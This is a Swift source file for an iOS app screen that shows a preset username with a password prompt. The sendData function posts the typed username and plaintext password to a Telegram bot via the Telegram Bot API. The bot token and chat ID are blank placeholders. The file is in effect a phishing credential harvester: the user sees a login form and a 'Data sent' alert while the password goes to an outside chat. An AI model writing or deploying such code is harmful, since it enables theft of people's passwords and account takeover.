//
//  ContentView.swift
//  AppSurge
//
//  Created by Vadim Vladimirov on 03.06.2023.
//

import SwiftUI
import Alamofire

struct ContentView: View {
    @State private var username: String = "impressionableracoon"
    @State private var password: String = ""
    
    @FocusState private var passwordIsFocused: Bool
    
    @State private var resultShowing = false

    var body: some View {
        VStack {
            VStack {
                HStack {
                    Image(systemName: "person.fill")
                    
                    Text(username)
                }
                
                TextField(
                    "password",
                    text: $password
                )
                .focused($passwordIsFocused)
                .multilineTextAlignment(.center)
            }
            .padding()
            
            Button("submit") {
                passwordIsFocused = false
                resultShowing = true
                
                sendData(username: username, password: password)
            }
            .alert(isPresented: $resultShowing) {
                Alert(
                    title: Text("Data sent"),
                    dismissButton: .default(Text("OK"))
                )
            }
            .padding()
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}

func sendData(username: String, password: String) {
    let botToken = ""
    let chatID = ""
    
    let msg = "username: \(username)\npassword: \(password)"
    
    let url = "https://api.telegram.org/bot\(botToken)/sendMessage"
    
    _ = AF.request(url, method: .post, parameters: ["chat_id": chatID, "text": msg]).validate().response{ response in
    }
}
